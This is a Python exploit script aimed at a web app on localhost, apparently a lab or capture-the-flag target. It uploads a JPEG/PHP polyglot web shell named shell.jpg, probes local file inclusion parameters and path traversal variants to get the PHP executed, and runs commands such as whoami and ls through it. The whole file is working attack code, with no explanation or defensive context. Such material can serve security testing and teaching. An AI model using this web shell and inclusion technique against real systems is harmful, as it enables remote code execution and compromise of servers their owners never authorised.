import requests
import re

base_url = "http://127.0.0.1:32824"
print("Testing for Local File Inclusion (LFI) to execute uploaded PHP")
print("=" * 60)

# First, upload our polyglot payload again
polyglot_content = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"
    b"<?php system($_GET['cmd']); ?>"
    b"\xff\xd9"
)

files = {'userfile': ('shell.jpg', polyglot_content, 'image/jpeg')}
data = {'submit': 'Upload Image'}

print("[1] Uploading polyglot shell.jpg...")
upload_resp = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)

if "successfully uploaded" in upload_resp.text:
    match = re.search(r"href='upload/([^']+)'", upload_resp.text)
    if match:
        filename = match.group(1)
        print(f"✅ File uploaded as: {filename}")
        
        # Try LFI techniques to include and execute the file
        print("\n[2] Testing LFI inclusion methods:")
        
        # Common PHP LFI parameters
        lfi_params = ['page', 'file', 'include', 'dir', 'load', 'read', 'view']
        
        for param in lfi_params:
            # Try direct filename
            test_url = f"{base_url}/index.php?{param}=upload/{filename}"
            print(f"\n[*] Testing: {test_url}")
            resp = requests.get(test_url, timeout=10)
            
            if resp.status_code == 200:
                print(f"Status: {resp.status_code}")
                print(f"Length: {len(resp.text)}")
                # Check if different from normal page
                if len(resp.text) < 3000 or "pwd" in resp.text or "html" not in resp.text:
                    print(f"🔍 Response:\n{resp.text[:1000]}")
                    # Try with command parameter
                    cmd_url = f"{test_url}&cmd=whoami"
                    cmd_resp = requests.get(cmd_url, timeout=10)
                    if cmd_resp.text != resp.text:
                        print(f"🔥 COMMAND EXECUTED:\n{cmd_resp.text}")
        
        # Try path traversal techniques
        print("\n[3] Testing path traversal variants:")
        traversal_patterns = [
            "../../../../upload/shell.jpg",
            "....//....//....//upload/shell.jpg",
            "..\\..\\..\\upload/shell.jpg",
            "/upload/shell.jpg",
            "upload/shell.jpg"
        ]
        
        for pattern in traversal_patterns:
            for param in lfi_params:
                test_url = f"{base_url}/index.php?{param}={pattern}"
                print(f"\n[*] Testing: {test_url}")
                resp = requests.get(test_url, timeout=10)
                
                if resp.status_code == 200 and len(resp.text) < 2000:
                    print(f"Status: {resp.status_code}")
                    print(f"Length: {len(resp.text)}")
                    print(f"🔍 Response snippet:\n{resp.text[:500]}")
                    
                    # Test with cmd parameter
                    cmd_resp = requests.get(f"{test_url}&cmd=ls", timeout=10)
                    if cmd_resp.text != resp.text and len(cmd_resp.text) < 1000:
                        print(f"🔥 COMMAND EXECUTED:\n{cmd_resp.text}")

print("\n" + "=" * 60)
print("LFI test complete.")
